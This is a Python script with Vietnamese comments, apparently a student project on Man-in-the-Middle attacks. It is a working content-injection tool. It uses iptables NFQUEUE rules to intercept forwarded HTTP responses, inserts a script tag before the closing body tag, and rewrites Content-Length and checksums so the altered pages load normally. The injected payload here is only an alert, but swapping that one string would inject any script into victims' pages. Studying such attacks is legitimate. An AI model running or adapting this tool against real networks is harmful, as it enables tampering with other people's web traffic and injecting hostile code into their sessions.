#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Kịch bản Tấn công Giả mạo Nội dung (Content Tampering / Malicious JavaScript Injection)
Tác giả: Nguyễn Thị Kỳ Duyên (MSSV: 0023410647 - Lớp: ĐHCNTT23B-CS)
Đề tài: Nghiên cứu kỹ thuật khai thác và phòng chống tấn công Man-in-the-Middle

Cách dùng:
    # 1. Định tuyến gói tin HTTP qua hàng đợi NFQUEUE của Linux iptables:
    sudo iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1
    # 2. Chạy kịch bản chèn mã độc:
    sudo python3 content_injection.py
    # 3. Khi dừng kịch bản, xóa quy tắc iptables:
    sudo iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1
"""

import re
from scapy.all import IP, TCP, Raw

INJECTION_CODE = '<script>alert("CANH BAO AN NINH: Phien cua ban dang bi tan cong Man-in-the-Middle!");</script></body>'

def process_packet(packet):
    """Bắt và sửa đổi payload của gói tin HTTP phản hồi"""
    scapy_pkt = IP(packet.get_payload())

    if scapy_pkt.haslayer(Raw):
        payload = scapy_pkt[Raw].load.decode('utf-8', errors='ignore')
        # Kiểm tra xem đây có phải là phản hồi HTML (chứa thẻ đóng </body>)
        if "HTTP/1.1 200 OK" in payload and "</body>" in payload:
            print("[+] Phát hiện trang web phản hồi HTTP! Đang tiêm mã JavaScript...")
            modified_payload = payload.replace("</body>", INJECTION_CODE)
            # Cập nhật lại độ dài trường Content-Length nếu có
            content_length_search = re.search(r"Content-Length:\s*(\d+)", payload)
            if content_length_search:
                old_len = int(content_length_search.group(1))
                new_len = old_len + len(INJECTION_CODE) - len("</body>")
                modified_payload = re.sub(r"Content-Length:\s*\d+", f"Content-Length: {new_len}", modified_payload)

            scapy_pkt[Raw].load = modified_payload.encode('utf-8')
            # Xóa checksum để Scapy tự động tính toán lại
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            packet.set_payload(bytes(scapy_pkt))

    packet.accept()

if __name__ == "__main__":
    try:
        from netfilterqueue import NetfilterQueue
        print("=" * 65)
        print("   CÔNG CỤ TIÊM MÃ ĐỘC JAVASCRIPT QUA HÀNG ĐỢI NFQUEUE              ")
        print("   Đề tài: Nghiên cứu kỹ thuật khai thác & phòng chống MitM         ")
        print("=" * 65)
        print("[*] Đang lắng nghe trên NFQUEUE queue-num=1...")
        queue = NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()
    except ImportError:
        print("[!] Thư viện 'netfilterqueue' chưa được cài đặt.")
        print("[*] Hướng dẫn cài đặt trên Kali/Ubuntu: sudo apt-get install libnetfilter-queue-dev && pip3 install netfilterqueue")
    except KeyboardInterrupt:
        print("\n[+] Đã dừng kịch bản tiêm mã an toàn.")
